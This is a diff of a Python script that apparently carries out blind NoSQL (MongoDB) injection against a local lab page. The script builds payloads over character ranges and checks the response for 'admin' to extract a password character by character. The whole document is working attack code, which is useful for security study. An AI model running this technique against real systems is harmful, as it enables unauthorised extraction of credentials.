@@ -24,7 +24,7 @@ cap_url = "http://localhost:8000/mongodb/example2/?" + test_load ###### NORMAL L
 '''
 import requests
 import urllib
-import time
+import re
 from bs4 import BeautifulSoup as soup
 
 def buildPayload(rangeStr, known_chars):
@@ -37,15 +37,15 @@ halfLenRange = int(len(full_range) / 2)
 front_range = full_range[:halfLenRange]
 back_range = full_range[halfLenRange:]
 pwd = ""
-test_load = buildPayload(back_range, pwd)
+test_load = buildPayload(front_range, pwd)
 #print(test_load)
 
 cap_url = "http://localhost:8000/mongodb/example2/?" + test_load
 session = requests.Session()
 cap_response = session.get(cap_url)
-resp_text = soup(cap_response.text, "html.parser")
-print(resp_text.get_text(" "))
-
-
-
-
+tgt_soup = soup(cap_response.text, "html.parser")
+if (tgt_soup.body.find_all(string="admin")):
+	print("It's a match")
+else:
+	print("No match")
+print(tgt_soup.body.find_all(string="admin"))
